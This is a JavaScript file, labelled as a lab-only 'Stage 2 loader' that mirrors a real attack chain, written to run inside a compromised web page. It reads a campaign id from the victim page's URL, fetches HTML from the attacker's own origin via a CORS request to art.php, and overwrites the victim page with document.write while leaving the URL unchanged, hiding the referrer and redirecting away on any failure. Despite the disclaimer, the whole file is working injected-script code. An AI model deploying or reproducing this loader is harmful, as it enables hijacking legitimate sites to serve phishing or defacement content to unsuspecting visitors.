/*
 * LAB ONLY â€” authorized testing on your own systems.
 * Stage 2: the loader. Mirrors the real fx.js chain:
 *   read the campaign id from the victim URL -> fetch art.php (CORS) -> document.write.
 */
(function () {
  var W = window.top;                       // run against the TOP window (the victim page)
  if (W.__fc_ran) return;                   // re-entrancy guard: run once
  W.__fc_ran = 1;

  // Auto-detect this script's own origin, so no editing is needed on a live
  // domain. Falls back to localhost for the local lab.
  function ownOrigin() {
    try {
      var s = document.currentScript;
      if (s && s.src) {
        var a = document.createElement('a');
        a.href = s.src;
        return a.protocol + '//' + a.host;
      }
    } catch (e) {}
    return 'http://127.0.0.1:8001';
  }
  var BASE = ownOrigin();
  var FAIL = BASE + '/';

  function bail(u) {                        // hide the referrer, then navigate away
    try {
      var m = W.document.createElement('meta');
      m.name = 'referrer';
      m.content = 'no-referrer';
      W.document.head.appendChild(m);
    } catch (e) {}
    W.location.replace(u);
  }

  function gp(n) {
    var m = new RegExp('[?&]' + n + '=([^&]+)', 'i').exec(W.location.search || '');
    if (!m) return '';
    var raw = m[1];
    // decode up to 2 times to survive accidental double-encoding
    for (var i = 0; i < 2; i++) {
      try {
        var d = decodeURIComponent(raw);
        if (d === raw) break;
        raw = d;
      } catch (e) { break; }
    }
    return raw;
  }

  // Unicode-aware whitelist.
  // \p{L} = letters, \p{M} = combining marks (Bengali à¦¾ à¦¿ à§€ à§ à§‚ à§‡ à§ˆ à§‹ à§Œ à¦‚ à¦ƒ à¦,
  // Arabic harakat), \p{N} = numbers, plus _ and -.
  // Without \p{M}, Bengali/Arabic vowel signs get rejected.
  function isValidSlug(id) {
    if (typeof id !== 'string') return false;
    if (id.length < 1 || id.length > 80) return false;
    try {
      return /^[\p{L}\p{M}\p{N}_-]+$/u.test(id);
    } catch (e) {
      // very old browser without unicode property escapes
      return /^[A-Za-z0-9_\-\u0080-\uFFFF]+$/.test(id);
    }
  }

  var id = gp('GetFoldersAndFiles') || gp('id');
  if (!isValidSlug(id)) return bail(FAIL);   // Unicode-aware whitelist

  var fin = 0;
  var t = setTimeout(function () { if (!fin) bail(FAIL); }, 15000);   // watchdog

  fetch(BASE + '/fc/art.php?id=' + encodeURIComponent(id), {
    mode: 'cors',
    credentials: 'omit',
    referrerPolicy: 'no-referrer',
    cache: 'no-store'
  })
    .then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.text(); })
    .then(function (html) {
      if (!html || html.length < 50) throw new Error('empty');
      fin = 1;
      clearTimeout(t);
      var d = W.document;
      d.open(); d.write(html); d.close();   // replace the victim page; URL unchanged
      W.scrollTo(0, 0);
    })
    .catch(function (e) {
      clearTimeout(t);
      try { console.error('[FC]', e); } catch (x) {}
      if (!fin) bail(FAIL);                 // anything goes wrong -> hard redirect
    });
})();